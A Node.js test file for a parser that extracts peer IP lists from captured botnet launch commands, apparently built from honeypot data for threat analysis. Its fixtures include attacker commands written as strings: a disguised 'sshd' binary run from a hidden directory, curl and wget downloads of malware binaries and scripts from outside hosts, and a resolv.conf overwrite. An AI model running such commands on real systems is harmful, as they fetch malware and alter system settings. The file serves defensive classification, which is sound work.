const test = require('node:test');
const assert = require('node:assert');
const { extractPeers, isRoutableIpv4 } = require('../lib/peers');

const DIR = '.4293177954799656937';
const launch = (ips) => `chmod +x ./${DIR}/sshd;nohup ./${DIR}/sshd${ips ? ' ' + ips : '  '} &`;

test('pulls the peer list out of a real launch command', () => {
  const r = extractPeers(launch('177.10.201.11 170.150.255.26 103.188.82.254'));
  assert.strictEqual(r.isSpreader, true);
  assert.deepStrictEqual(r.peers, ['177.10.201.11', '170.150.255.26', '103.188.82.254']);
});

test('an empty list is a spreader with no peers, not a parse failure', () => {
  // 45 of the 160 captured launches pass nothing at all; the binary falls back
  // to its embedded list. Treating these as failures would overstate how often
  // the operator ships a fresh bootstrap set.
  const r = extractPeers(launch(''));
  assert.strictEqual(r.isSpreader, true);
  assert.deepStrictEqual(r.peers, []);
});

test('only the launch command yields peers', () => {
  // A loose "IPv4 in a command" rule would file C2 servers, download hosts and
  // resolv.conf entries as mesh members.
  for (const c of [
    'curl http://120.77.178.159:9438/linux -o /tmp/AB',
    'echo "nameserver 8.8.4.4" > /etc/resolv.conf',
    'wget http://1.2.3.4/bins.sh; chmod 777 bins.sh',
    'uname -a',
  ]) {
    const r = extractPeers(c);
    assert.strictEqual(r.isSpreader, false, `should not be a spreader: ${c}`);
    assert.deepStrictEqual(r.peers, []);
  }
});

test('the hidden directory must look like the real one', () => {
  // ./.<long digits>/sshd is the specific shape. A short or non-numeric
  // directory is some other program.
  assert.strictEqual(extractPeers('chmod +x ./.42/sshd;nohup ./.42/sshd 8.8.8.8 &').isSpreader, false);
  assert.strictEqual(extractPeers('nohup ./.cache/sshd 8.8.8.8 &').isSpreader, false);
});

test('private, loopback and multicast addresses are dropped', () => {
  const r = extractPeers(launch('8.8.8.8 192.168.1.5 127.0.0.1 10.0.0.1 224.0.0.1 172.16.5.5 1.1.1.1'));
  assert.deepStrictEqual(r.peers, ['8.8.8.8', '1.1.1.1']);
});

test('malformed octets are not addresses', () => {
  assert.deepStrictEqual(extractPeers(launch('999.1.1.1 8.8.8.8 1.2.3')).peers, ['8.8.8.8']);
});

test('a repeated peer counts once per list', () => {
  assert.deepStrictEqual(extractPeers(launch('8.8.8.8 8.8.8.8 1.1.1.1')).peers, ['8.8.8.8', '1.1.1.1']);
});

test('routability rules', () => {
  for (const ip of ['127.0.0.1', '10.1.2.3', '192.168.0.1', '172.20.0.1', '169.254.1.1', '0.0.0.0', '239.1.1.1'])
    assert.strictEqual(isRoutableIpv4(ip), false, ip);
  for (const ip of ['8.8.8.8', '158.51.96.38', '172.15.1.1', '172.32.1.1', '203.0.113.5'])
    assert.strictEqual(isRoutableIpv4(ip), true, ip);
});

test('degenerate input never throws', () => {
  for (const c of [null, undefined, '', 42, {}]) {
    assert.doesNotThrow(() => extractPeers(c));
    assert.deepStrictEqual(extractPeers(c), { isSpreader: false, peers: [] });
  }
});
